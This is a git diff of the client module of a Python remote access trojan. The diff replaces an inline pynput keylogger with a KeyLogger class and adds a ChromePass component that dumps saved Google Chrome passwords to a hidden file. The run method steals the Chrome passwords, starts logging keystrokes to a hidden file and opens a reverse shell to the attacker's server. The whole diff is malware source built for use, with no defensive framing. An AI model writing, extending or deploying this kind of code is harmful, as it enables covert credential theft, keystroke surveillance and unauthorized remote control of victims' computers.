@@ -1,29 +1,36 @@
 from connection import Connection
 from rev_shell import Shell
-import time
 import socket
-import logging
-from pynput.keyboard import Key, Listener
+from chrome_passwords import ChromePass
+from keylogger import KeyLogger
 
 
 class Client:
     """
     Performs all necessary actions for the RAT to function:
         - Creates socket
+        - Gets passwords from google chrome
         - Logs key events to a file
         - Gets a reverse shell back to the server
     """
 
-    def __init__(self, host: str, port: int, filename: str = "activity.txt") -> None:
+    def __init__(self, host: str, port: int, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
         """
         Constructor
+
+        required:
         :param host: The server's IP
         :param port: The server's port number
-        :param filename: The file's name where the keystrokes are stored
+        
+        optional:
+        :param keylog_filename: The file's name where the keystrokes are stored
+        :param chromepass_filename: The file name where the chrome passwords are stored
         """
+
         self.host = host
         self.port = port
-        self.filename = filename
+        self.keylog_filename = keylog_filename
+        self.chromepass_filename = chromepass_filename
 
         # Create client instance
         self.client = Connection(self.host, self.port)
@@ -34,25 +41,30 @@ class Client:
         # Create shell instance
         self.shell = Shell(self.sock)
 
+        # Create google password collector instance
+        self.chrome_pass = ChromePass(self.chromepass_filename)
+
+        # Initialize keylogger instance
+        self.keylogger = KeyLogger(self.keylog_filename)
+
+
     def run(self) -> None:
         """
-        Creates a connection between server and client.
-        Starts logging key events
-        Gets a reverse shell from client to server
+        1. Stores google chrome passwords to file
+        2. Starts logging key events to file
+        3. Gets a reverse shell from client to server
         """
+
+        #-------------------------CHROME PASSWORDS---------------------#
+
+        self.chrome_pass.get_chrome_pass()
+
         # --------------------------KEYLOGGER--------------------------#
 
-        logging.basicConfig(filename=(self.filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-        def on_press(key):
-            logging.info(str(key))
-
-        listener = Listener(on_press=on_press)
-        listener.start()
+        self.keylogger.start_log()
 
         # --------------------------REV SHELL--------------------------#
 
-        # Get a reverse shell back to server
         self.shell.get_shell()
 
         # --------------------------------------------------------------#
